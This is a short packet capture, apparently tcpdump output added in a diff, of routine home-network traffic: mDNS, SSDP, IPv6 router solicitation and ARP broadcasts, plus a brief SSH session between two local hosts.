+17:54:46.818181 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:46.818321 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:54:58.385752 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::2: ICMP6, router solicitation, length 16
+17:55:02.848569 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:55:02.848723 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:55:31.666197 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::2: ICMP6, router solicitation, length 16
+17:55:34.857027 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:55:34.857244 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:56:03.929517 IP pc3.55726 > 239.255.255.250.ssdp: UDP, length 166
+17:56:04.930293 IP pc3.55726 > 239.255.255.250.ssdp: UDP, length 166
+17:56:05.930666 IP pc3.55726 > 239.255.255.250.ssdp: UDP, length 166
+17:56:06.931343 IP pc3.55726 > 239.255.255.250.ssdp: UDP, length 166
+17:56:35.660048 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::2: ICMP6, router solicitation, length 16
+17:56:38.923020 IP RedmiNote8T-Redmi.mdns > 224.0.0.251.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:56:38.923176 IP6 fe80::4e63:71ff:fe70:d9ff.mdns > ff02::fb.mdns: 0*- [0q] 4/0/3 (Cache flush) PTR Android.local., (Cache flush) PTR Android.local., (Cache flush) A 192.168.1.180, (Cache flush) AAAA fe80::4e63:71ff:fe70:d9ff (247)
+17:58:03.936060 IP pc3.54415 > 239.255.255.250.ssdp: UDP, length 166
+17:58:04.937785 IP pc3.54415 > 239.255.255.250.ssdp: UDP, length 166
+17:58:05.938536 IP pc3.54415 > 239.255.255.250.ssdp: UDP, length 166
+17:58:06.939788 IP pc3.54415 > 239.255.255.250.ssdp: UDP, length 166
+17:58:48.800130 IP6 fe80::4e63:71ff:fe70:d9ff > ff02::2: ICMP6, router solicitation, length 16
+18:00:03.942538 IP pc3.33216 > 239.255.255.250.ssdp: UDP, length 166
+18:00:04.944188 IP pc3.33216 > 239.255.255.250.ssdp: UDP, length 166
+18:00:05.945409 IP pc3.33216 > 239.255.255.250.ssdp: UDP, length 166
+18:00:06.946561 IP pc3.33216 > 239.255.255.250.ssdp: UDP, length 166
+18:00:49.662402 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:00:50.659841 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:00:51.658817 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:00:52.659389 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:00:53.659014 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:00:54.670407 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:02.664130 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:03.691493 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:04.661876 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:05.721969 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:06.701559 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:07.710622 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:15.665543 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:16.662878 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:17.662899 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:18.663371 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:19.671761 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:20.685593 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:28.666035 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:29.666991 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:30.667006 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:31.673103 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:32.666027 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:33.665901 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:41.670285 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:42.665859 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:43.667145 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:44.667389 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:45.667048 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:01:46.667940 ARP, Request who-has 192.168.1.128 tell amazon-116d64fa5, length 46
+18:02:03.948542 IP pc3.57520 > 239.255.255.250.ssdp: UDP, length 166
+18:02:04.950175 IP pc3.57520 > 239.255.255.250.ssdp: UDP, length 166
+18:02:05.950772 IP pc3.57520 > 239.255.255.250.ssdp: UDP, length 166
+18:02:06.952274 IP pc3.57520 > 239.255.255.250.ssdp: UDP, length 166
+18:03:03.416154 ARP, Request who-has mj tell _gateway, length 46
+18:03:10.163179 IP pc3.50386 > alarmpi.ssh: Flags [P.], seq 1:69, ack 188, win 8021, options [nop,nop,TS val 2224084052 ecr 3860101834], length 68
+18:03:10.209754 IP alarmpi.ssh > pc3.50386: Flags [.], ack 69, win 501, options [nop,nop,TS val 3866262091 ecr 2224084052], length 0
+18:03:10.596045 IP pc3.50386 > alarmpi.ssh: Flags [P.], seq 69:137, ack 188, win 8021, options [nop,nop,TS val 2224084484 ecr 3866262091], length 68
+18:03:10.596137 IP alarmpi.ssh > pc3.50386: Flags [.], ack 137, win 501, options [nop,nop,TS val 3866262478 ecr 2224084484], length 0
+18:03:14.174560 IP pc3.50386 > alarmpi.ssh: Flags [P.], seq 137:205, ack 188, win 8021, options [nop,nop,TS val 2224088063 ecr 3866262478], length 68
+18:03:14.174678 IP alarmpi.ssh > pc3.50386: Flags [.], ack 205, win 501, options [nop,nop,TS val 3866266056 ecr 2224088063], length 0
+18:03:14.813452 IP pc3.50386 > alarmpi.ssh: Flags [P.], seq 205:273, ack 188, win 8021, options [nop,nop,TS val 2224088702 ecr 3866266056], length 68
+18:03:14.813545 IP alarmpi.ssh > pc3.50386: Flags [.], ack 273, win 501, options [nop,nop,TS val 3866266695 ecr 2224088702], length 0
+
